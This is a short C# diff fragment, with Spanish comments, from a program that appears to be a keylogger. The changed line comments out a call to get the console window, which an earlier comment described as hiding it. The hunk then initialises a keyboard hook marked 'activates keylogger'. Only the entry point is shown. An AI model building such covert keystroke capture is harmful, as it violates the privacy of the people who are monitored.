@@ -7,7 +7,7 @@ namespace OtraPrueba2 {
     {
         public static void Main()
         {
-            var handle = GetConsoleWindow(); // Ocultar la ventana
+            //var handle = GetConsoleWindow(); // Obtener la ventana
 
             //Activa keylogger
             KeyboardHook.Initialize();
